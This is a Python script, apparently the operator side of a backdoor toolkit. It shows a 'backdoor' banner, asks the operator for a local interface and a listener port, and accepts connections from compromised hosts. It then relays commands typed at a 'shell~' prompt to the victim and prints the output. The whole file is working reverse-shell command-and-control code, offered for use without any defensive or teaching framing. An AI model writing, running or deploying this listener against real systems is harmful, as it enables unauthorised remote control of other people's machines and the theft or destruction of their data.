import sys
import os

from importmonkey import add_path

''' Export python module path '''

_i = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _i not in sys.path:
    add_path(_i)

import json
from toolbox.util.iputils import *

from toolbox.print.banner import *
from toolbox.print.clprinter import *

print_horizontal_delimiter()
print_backdoor_banner()
print_horizontal_delimiter()
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
interfaces = get_interfaces_ipv4_dict()

def reliable_send(command, target):
    jsondata = json.dumps(command)
    target.send(jsondata.encode())

def reliable_receive(target):
    data = ""
    while(True):
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except:
            continue

def handle_connection(s):
    print("# Listening for incoming connections...")
    target, ip = s.accept()
    print(f"[+] Started new communication with {ip}")
    communicate(target, ip)
def communicate(target, ip):
    while(True):
        command = input("shell~%s" % str(ip))
        reliable_send(command, target)
        if command == "exit":
            quit()
        if command[:3] == "cd ":
            pass
        else:
            result = reliable_receive(target)
            print(result)

interface = input("# Step 1: Specify network interface to use\n"
                     f"# all interfaces: {interfaces}\n"
                     "# ex. wlan0\n")
LHOST = interfaces.get(interface)
print(f"[i] LHOST is set to {LHOST}")
LPORT = input("# Step 2: Specify listener port\n"
                     "# ex. 4444\n")
print(f"[i] LPORT is set to {LPORT}")
s.bind((LHOST, int(LPORT)))
s.listen(1)
while(True):
    handle_connection(s)